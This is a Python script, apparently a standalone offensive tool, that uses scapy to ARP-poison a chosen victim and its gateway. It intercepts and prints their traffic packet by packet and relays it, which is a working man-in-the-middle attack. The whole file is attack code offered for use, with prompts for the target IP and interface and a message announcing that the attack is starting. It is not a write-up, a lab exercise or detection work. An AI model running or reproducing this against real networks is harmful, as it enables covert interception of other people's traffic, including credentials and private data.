from scapy.all import *
import os
import sys
import time
import threading
import psutil
import socket

from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, ARP, srp



def get_information():
    try:  # get information from the user
        victim_ip = input("Enter the IP address of the target: ")
        interface = input("Enter the name of the interface: ")
        gateway_ip = input("Enter the gateway IP address: ")
    except KeyboardInterrupt:
        print("\n[-] User requested shutdown")
        print("[-] Exiting...")
        sys.exit(1)
    return victim_ip, interface, gateway_ip


VICTIM_IP, INTERFACE, GATEWAY_IP = get_information()


def get_mac(ip):  # return the MAC address of the target
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=INTERFACE, timeout=2, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")






# send ARP responses to the target and the gateway
def arp_poison(gateway_mac, victim_mac):
    send(ARP(op=2, pdst=VICTIM_IP, psrc=GATEWAY_IP, hwdst=victim_mac), iface=INTERFACE)
    send(ARP(op=2, pdst=GATEWAY_IP, psrc=VICTIM_IP, hwdst=gateway_mac), iface=INTERFACE)


def reArp(gateway_mac, victim_mac):  # restore the network to its normal state
    print("\n[*] Restoring targets...")
    send(ARP(op=2, pdst=GATEWAY_IP, psrc=VICTIM_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5)
    send(ARP(op=2, pdst=VICTIM_IP, psrc=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

    print("[*] Shutting down...")
    sys.exit(1)

def get_mac_from_victim():
    # get MAC addresses of victim machine and access point
    try:
        victim_mac = get_mac(VICTIM_IP)
        return victim_mac
    except Exception:
        print("couldn't find victim MAC address")
        sys.exit(1)

def get_mac_from_gateway():
    try:
        gateway_mac = get_mac(GATEWAY_IP)
        return gateway_mac
    except Exception:
        print("couldn't find gateway MAC address")
        sys.exit(1)


def mitm(gateway_mac, victim_mac):
    while True:
        try:
            arp_poison(gateway_mac, victim_mac)  # send ARP responses to the target and the gateway
            sniff_packets(INTERFACE, VICTIM_IP, GATEWAY_IP)  # start sniffing packets
            time.sleep(1.5)  # wait for 1.5 seconds
        except Exception:
            reArp(gateway_mac, victim_mac)


def process_packet(packet):
    # Check if the packet has an IP layer
    if packet.haslayer(IP):
        if packet[IP].src == VICTIM_IP:  # if the packet is from the victim
            print("packet from victim")
            # print the packet's information
            packet.show()
            packet[Ether].src = get_mac_from_victim()  # change the source MAC address to the attacker's MAC address
            packet[Ether].dst = get_mac_from_gateway()  # change the destination MAC address to the gateway's MAC address
            sendp(packet, iface=INTERFACE)  # send the packet to the gateway
        elif packet[IP].src == GATEWAY_IP:  # if the packet is from the gateway
            print("packet from gateway")
            # print the packet's information
            packet.show()
            packet[Ether].src = get_mac_from_gateway()  # change the source MAC address to the gateway's MAC address
            packet[Ether].dst = get_mac_from_victim()  # change the destination MAC address to the victim's MAC address
            sendp(packet, iface=INTERFACE)  # send the packet to the victim



def sniff_packets(interface, victim_ip, gateway_ip):
    try:
        sniff(iface=interface, prn=process_packet, filter="host " + victim_ip + " or host " + gateway_ip, store=0)
    except KeyboardInterrupt:
        print("shutting down")
        sys.exit(1)


if __name__ == '__main__':

    print("ip_forward needs to be enabled for the attack to work properly")

    # get MAC addresses of victim machine and access point
    gateway_mac = get_mac_from_gateway()
    victim_mac = get_mac_from_victim()

    if victim_mac == None or gateway_mac == None:
        print("Couldn't find MAC of victim or gateway address")
        sys.exit(1)
    print("the attack is starting")
    mitm(gateway_mac, victim_mac)
